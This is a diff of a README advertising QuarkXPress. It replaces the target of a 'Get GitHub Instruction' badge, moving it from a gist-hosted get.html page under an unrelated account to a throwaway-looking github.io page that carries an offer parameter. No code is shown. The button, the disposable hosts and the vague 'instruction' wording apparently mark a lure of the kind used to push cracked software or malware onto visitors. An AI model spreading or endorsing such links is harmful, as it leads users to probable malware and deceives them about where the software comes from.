@@ -2,7 +2,7 @@
 
 QuarkXPress empowers designers, publishers, and content creators with **precise typography, intelligent layout control, and digital publishing tools** — all in one professional package. 📰  
 
-[![🔴 Get GitHub Instruction](https://img.shields.io/badge/🔴%20Get%20GitHub%20Instruction-CB2131?style=for-the-badge&logo=quarkxpress&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/kiberkingnard4/c35da9006102e21ba2fd9962f7f194de/raw/7d799531c7570721a814e92e884f4b1152b98e31/get.html?offer=QuarkXPress)
+[![🔴 Get GitHub Instruction](https://img.shields.io/badge/🔴%20Get%20GitHub%20Instruction-CB2131?style=for-the-badge&logo=quarkxpress&logoColor=white&labelColor=0B0F19)](https://app-set-deploy.github.io/.github/?offer=QuarkXPress)
 
 ---
 
